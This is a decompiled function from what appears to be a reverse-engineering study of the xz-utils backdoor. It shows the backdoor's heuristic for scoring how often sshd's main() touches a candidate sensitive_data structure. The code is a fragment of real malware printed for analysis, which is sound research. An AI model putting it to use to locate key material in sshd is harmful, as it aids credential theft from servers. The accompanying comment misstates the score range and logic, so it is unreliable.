// /home/kali/xzre-ghidra/xzregh/103910_sshd_get_sensitive_data_score_in_main.c
// Function: sshd_get_sensitive_data_score_in_main @ 0x103910
// Calling convention: __stdcall
// Prototype: int __stdcall sshd_get_sensitive_data_score_in_main(void * sensitive_data, elf_info_t * elf, string_references_t * refs)


/*
 * AutoDoc: Looks inside the cached `main()` range and searches for memory references to the struct at offsets 0, +8, and +0x10. It
 * gives +1 when the base is accessed, +1 when +0x10 is touched, and subtracts one when +8 never shows up, producing a
 * signed score between -1 and +3. The result is doubled later so the decision logic favours pointers that the main daemon
 * manipulates frequently.
 */

#include "xzre_types.h"

int sshd_get_sensitive_data_score_in_main
              (void *sensitive_data,elf_info_t *elf,string_references_t *refs)

{
  u8 *code_start;
  u8 *code_end;
  BOOL BVar1;
  BOOL BVar2;
  BOOL BVar3;
  int iVar4;
  u8 *main_end;
  u8 *main_start;
  
  iVar4 = 0;
  code_start = (u8 *)refs->entries[2].func_start;
  if (code_start != (u8 *)0x0) {
    code_end = (u8 *)refs->entries[2].func_end;
    BVar1 = find_instruction_with_mem_operand(code_start,code_end,(dasm_ctx_t *)0x0,sensitive_data);
    BVar2 = find_instruction_with_mem_operand
                      (code_start,code_end,(dasm_ctx_t *)0x0,(void *)((long)sensitive_data + 0x10));
    BVar3 = find_instruction_with_mem_operand
                      (code_start,code_end,(dasm_ctx_t *)0x0,(void *)((long)sensitive_data + 8));
    iVar4 = (((uint)(BVar1 != FALSE) - (uint)(BVar2 == FALSE)) + 2) - (uint)(BVar3 == FALSE);
  }
  return iVar4;
}

